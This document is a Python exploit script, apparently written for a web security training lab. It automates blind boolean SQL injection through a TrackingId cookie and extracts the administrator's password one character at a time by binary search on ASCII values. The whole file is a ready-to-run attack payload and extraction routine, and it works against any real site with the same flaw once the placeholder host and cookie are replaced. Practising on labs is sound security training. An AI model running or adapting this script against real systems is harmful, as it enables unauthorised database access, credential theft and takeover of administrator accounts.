#!/usr/bin/env python3
import requests
import sys

HOST = "https://YOUR-LAB-ID.web-security-academy.net"   # <-- update with your lab URL
SESSION_COOKIE = "YOUR-SESSION-COOKIE"                    # <-- update with a fresh session cookie
PASSWORD_LENGTH = 20
USERNAME = "administrator"

def make_request(condition_sql):
    payload = f"' OR ({condition_sql})-- -"
    cookies = {"TrackingId": payload, "session": SESSION_COOKIE}
    resp = requests.get(f"{HOST}/filter", params={"category": "Accessories"}, cookies=cookies)
    return resp.status_code, ("Welcome back" in resp.text), len(resp.text)

def get_char_ascii(position):
    low, high = 32, 126
    template = f"SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='{USERNAME}'"

    if position > 1:
        _, is_true, _ = make_request(
            f"SELECT LENGTH(password)>={position} FROM users WHERE username='{USERNAME}'"
        )
        if not is_true:
            return None

    while low < high:
        mid = (low + high + 1) // 2
        _, is_true, _ = make_request(f"({template})>{mid - 1}")
        if is_true:
            low = mid
        else:
            high = mid - 1
    return low

def main():
    password = ""
    print("Cracking administrator password...\n")
    for pos in range(1, PASSWORD_LENGTH + 1):
        code = get_char_ascii(pos)
        if code is None:
            print(f"\nReached end of password at position {pos}.")
            break
        char = chr(code)
        password += char
        print(f"Position {pos}: ASCII {code} -> '{char}'   (so far: {password})")
    print(f"\nFinal password: {password}")

if __name__ == "__main__":
    main()
